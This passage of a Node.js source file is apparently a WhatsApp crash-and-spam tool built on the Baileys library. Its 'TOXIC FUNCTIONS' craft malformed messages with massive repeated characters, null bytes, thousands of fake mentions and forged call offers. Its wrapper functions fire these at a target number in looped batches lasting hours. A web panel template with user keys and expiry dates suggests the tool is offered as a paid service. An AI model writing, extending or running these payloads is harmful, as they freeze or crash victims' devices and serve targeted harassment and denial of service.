  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== TOXIC FUNCTIONS ==================== //
async function ForceBitterSpam(sock, target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let ZayCoreX = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: '⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭'
                    },
                    footer: {
                        text: '⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: '⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭'
                            },
                            footer: {
                                text: '⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭'
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, ZayCoreX, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}

async function StickerPackFreeze(sock, target) {
  try {

    const stickerContent = {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "642f1c7a-094d-4ea7-82aa-d283952a4322",
            name: "https://Wa.me/stickerpack/RizFavboy",
            publisher: "Yayz",
            stickers: [
              {
                fileName: "hH9-mjYyzRiKyN89WuVcxbgidYdQeGjBxQeUfz3NVQ4=.webp",
                isAnimated: true,
                emojis: ["💀"],
                accessibilityLabel: "ꦾ".repeat(1500),
                isLottie: false,
                mimetype: "image/webp",
              },
              {
                fileName: "jpxNv2Sd1s6fL5-HnkMrNQY3XbN0YLO4th8uwwgl4dA=.webp",
                isAnimated: true,
                emojis: ["💀"],
                accessibilityLabel: "ꦾ".repeat(1500),
                isLottie: false,
                mimetype: "image/webp",
              },
              {
                fileName: "RrPMKWCtHlOwjp97mAglUYPIaJWYtVPmndIVDLDX96g=.webp",
                isAnimated: true,
                emojis: ["💀"],
                accessibilityLabel: "ꦾ".repeat(1500),
                isLottie: false,
                mimetype: "image/webp",
              },
            ],
            fileLength: 959168,
            fileSha256: Buffer.from("R45kqbx/nwvhGMMqLkD49f1ggQ9anc07PNnmx6TvoNE=", "base64"),
            fileEncSha256: Buffer.from("iiZJfuiGEdzzsXqOM3gzdFVgpz1MyY0GPMP7UAYGnZI=", "base64"),
            mediaKey: Buffer.from("GJAqSOkifR6DPqViXuBJ8P3+/NkzhsWH6EEuYTySJ4s=", "base64"),
            directPath: "/v/t62.15575-24/542959707_546680258506540_609965180471151393_n.enc",
            mediaKeyTimestamp: 1756908899,
            trayIconFileName: "642f1c7a-094d-4ea7-82aa-d283952a4322.png",
            thumbnailDirectPath: "/v/t62.15575-24/542690545_4192380777713097_4091855665882100743_n.enc",
            thumbnailSha256: Buffer.from("yXthaTViH0AaN5zl4KC6nd/MJcIW2TdUPMDeeHsNdSg=", "base64"),
            thumbnailEncSha256: Buffer.from("UDvv/9QVJLPYZ1VFrAmiD1CEDVZYIHmmxfg/fx8HN6Y=", "base64"),
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: Buffer.from(
              "ZDNjZWEwMjk3MGY3MzA5MGE0MzU3YzIwZDI1YmQyYjZlNWNjMGYxZjAwODUzNzYxMTUxN2NiYmI3NDExYTdjZQ==",
              "base64"
            ),
            stickerPackSize: 961398,
            stickerPackOrigin: "USER_CREATED",
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              businessMessageForwardInfo: {
                businessOwnerJid: "6288905301692@s.whatsapp.net",
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 5000 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  ),
                ],
              },
              quotedMessage: {
                interactiveResponseMessage: {
                  body: { text: "t.me/brightdayzx", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                    buttons: [
                      {
                        name: "payment_method",
                        buttonParamsJson: JSON.stringify({
                          reference_id: null,
                          payment_method: "\u0010".repeat(5000),
                          payment_timestamp: null,
                          share_payment_status: true,
                        }),
                      },
                    ],
                    messageParamsJson: "{}",
                  },
                },
              },
            },
          },
        },
      },
    };

    const stickerPack = generateWAMessageFromContent(
      target,
      stickerContent,
      { quoted: null }
    );

    // Spam loop
    for (let i = 0; i < 2000; i++) {
      await sock.relayMessage(
        target,
        stickerPack.message,
        { messageId: proto.generateMessageID() }
      );

      await new Promise(res => setTimeout(res, 1000));
    }

    await sock.relayMessage(
      "status@broadcast",
      stickerPack.message,
      {
        messageId: proto.generateMessageID(),
        statusJidList: [target]
      }
    );

    console.log(chalk.green.bold(`✔️ Success Mengirim Bug ${target}`));

  } catch (err) {}
}

async function BoySircle(target) {
const TrazApi = JSON.stringify({
status: true,
active: true,
criador: "$FriendMe",
messageParamsJson: "{".repeat(10000),
call_permission_request: {
status: true,
enabled: true,
version: 3,
},
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭",
hasMediaAttachment: false,
},
body: {
text: "⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭",
format: "DEFAULT",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
buttons: [
{
name: "nested_call_permission",
buttonParamsJson: JSON.stringify({
status: true,
power: "max",
ping: 9999,
cameraAccess: true 
}),
},
],
},
},
},
},
buttons: [
{
name: "nested_crash",
buttonParamsJson: JSON.stringify({
messageParamsJson: "{".repeat(10000),
crash: true,
overdrive: true,
}),
},
{
name: "multi_repeat",
buttonParamsJson: JSON.stringify({
status: true,
payload: Array.from({ length: 100 }, () => "{".repeat(50)),
cameraAccess: true 
}),
},
],
flood: Array.from({ length: 1000 }, () => ({
nulls: "\u0000".repeat(100),
emojis: "🦠".repeat(20),
status: true,
})),
});

const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭",
hasMediaAttachment: false,
},
body: {
text:
"⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭 " + "\u0000".repeat(10000),
format: "DEFAULT",
},
nativeFlowMessage: {
messageParamsJson: "{[".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: TrazApi,
},
...Array.from({ length: 4 }, () => ({
name: "call_permission_request",
buttonParamsJson: JSON.stringify({
status: true,
enabled: true,
overload: true,
cameraAccess: true 
}),
})),
],
},
},
},
},
},
{}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target },
});

}

async function ZanssNewUi(target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Zanss In Comming‌\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  "@1".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Thunder",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
  
async function trashdevice(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝐙𝐀𝐍𝐒𝐒 𝐗 𝐓𝐇𝐔𝐍𝐃𝐄𝐑🐉 ラ‣ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "#Thunder" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ZanssMods" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "im zanss️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    sock.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function BlankNewThunder(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Notif Apeni Dari Thunder" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

// [ FREZE-STUCK HOME SAAT MEMBACA PESAN ]
async function GrezzeThunder(target) {
                await sock.sendMessage(target, {
                        text: "🔥 Thunder Numpang Lewat" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
                        contentText: "Zanss Mods",
                        footer: "Bokep Crash",
                        viewOnce: true,
                        buttons: [{
                            buttonId: "🦠",
                            buttonText: {
                                displayText: "🦠"
                            },
                            type: 4,
                            nativeFlowInfo: {
                                name: "galaxy_message",
                                paramsJson: JSON.stringify({
                                    title: `► F1 ◄${"᬴".repeat(60000)}`,
                                    sections: [{
                                        title: "🩸Cie Ngefrezze",
                                        highlight_label: "label",
                                        rows: []
                                    }]
                                })
                            }
                        }],
                        headerType: 1,
                    }, { ephemeralExpiration: 5, timeStamp:  Date.now()});
                }

async function DelayBapakLo(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
        await BoySircle(target),
        await StickerPackFreeze(sock, target),
        await StickerPackFreeze(sock, target),
        await StickerPackFreeze(sock, target),
        await BoySircle(target),
        await sleep(4000)
        ]);
        console.log(chalk.red(`

❄️ Berhasil Send Bug Yang Ke ${count + 1}/10, Terlalu dingin Abangku
  `));
        count++;
        setTimeout(sendNext, 5000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function Forclose(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
        await ForceBitterSpam(sock, target),
        await ForceBitterSpam(sock, target),
        await ForceBitterSpam(sock, target),
        await ForceBitterSpam(sock, target),
        await StickerPackFreeze(sock, target),
        await BoySircle(target),
        await StickerPackFreeze(sock, target),
        await ForceBitterSpam(sock, target),
        await StickerPackFreeze(sock, target),
        await ForceBitterSpam(sock, target),
        await StickerPackFreeze(sock, target),
        await BoySircle(target),
            await sleep(5600)
        ])
        console.log(chalk.yellow(`
Succesfull Send Bug Yang Ke${count + 1}
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function StuckHome(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
        await StickerPackFreeze(sock, target),
        await BoySircle(target),
        await StickerPackFreeze(sock, target),
        await StickerPackFreeze(sock, target),
        await StickerPackFreeze(sock, target),
        await BoySircle(target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function BomBug(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
        await ZanssNewUi(target),
        await trashdevice(target),
        await BlankNewThunder(target),
        await GrezzeThunder(target),
        await sleep(5000)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 INVISIBLE 🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  userKey = "", // ✅ Parameter untuk key/password
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const filePath = path.join(__dirname, "Ini Bokep", "Zanss.html");

  try {
    let html = fs.readFileSync(filePath, "utf8");

    // Ganti semua placeholder di HTML - URUTAN PENTING!
    html = html
      // 1. Ganti userKey/password terlebih dahulu
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
      .replace(/\$\{userKey\}/g, userKey || "")
      .replace(/\$\{password\}/g, userKey || "")
      .replace(/\{\{password\}\}/g, userKey || "")
      .replace(/\{\{key\}\}/g, userKey || "")
      .replace(/\$\{key\}/g, userKey || "")
      // 2. Ganti username
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
      .replace(/\$\{username\}/g, username || "Unknown")
      .replace(/\{\{username\}\}/g, username || "Unknown")
      // 3. Ganti yang lainnya
      .replace(/\{\{expired\}\}/g, formattedTime)
      .replace(/\{\{status\}\}/g, status)
      .replace(/\{\{message\}\}/g, message)
      .replace(/\$\{formattedTime\}/g, formattedTime);

    return html;
  } catch (err) {
    console.error("Gagal membaca file Zanss.html:", err);
    return `<h1>Gagal memuat halaman</h1>`;
  }
};